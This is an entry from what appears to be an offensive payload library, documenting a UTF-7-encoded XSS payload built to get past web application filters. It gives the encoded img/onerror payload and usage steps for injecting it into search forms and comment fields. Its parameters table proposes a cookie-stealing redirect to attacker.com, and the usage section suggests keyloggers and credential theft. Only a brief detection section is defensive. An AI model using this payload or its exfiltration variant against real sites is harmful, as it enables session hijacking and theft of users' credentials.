---
id: 112bb60b-cf72-446a-a295-4e43fa3a568b
type: code
language: JavaScript
verified: true
created_at: '2023-04-06T03:56:43.027444+00:00'
updated_at: '2023-04-10T20:21:56.239032+00:00'
tags:
  - xss
  - filter-bypass
  - utf-7
platforms:
  - Web
validated: true
---

# UTF-7-Encoded-XSS-Alert-Payload

## Code

```javascript
+ADw-img src=+ACI-1+ACI- onerror=+ACI-alert(1)+ACI- /+AD4-
```

## Description

This JavaScript payload is encoded in UTF-7 to bypass web application filters that block standard XSS attempts. When decoded and rendered in HTML, it creates an <img> tag with an invalid src attribute, triggering the onerror event to execute alert(1), which displays a popup confirming code execution. It is used in reflected or stored XSS scenarios to test and exploit input validation weaknesses.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| alert(1) | The JavaScript function to execute on error; replace with custom code like document.location='http://attacker.com?cookie='+document.cookie for exfiltration | alert(document.cookie) |

## Usage

Inject this encoded string directly into a vulnerable input field on a web page that supports or mishandles UTF-7 encoding, such as search forms or comment sections. Submit the form and refresh or trigger the reflection to observe execution. Customize the onerror handler for advanced payloads like keyloggers or credential theft. Use in conjunction with tools like Burp Suite for interception and modification during testing.

## Detection

- Browser developer tools showing unexpected JavaScript execution or alerts.
- WAF logs detecting UTF-7 encoded strings (patterns like +ADw-, +AD4-) in requests.
- Content Security Policy violations if CSP is partially implemented.
- Server-side logging of unusual character encodings in user inputs.

## Related

- [[procedures/Filter-Bypass-using-UTF-7-Encoding-for-XSS-Injection]]
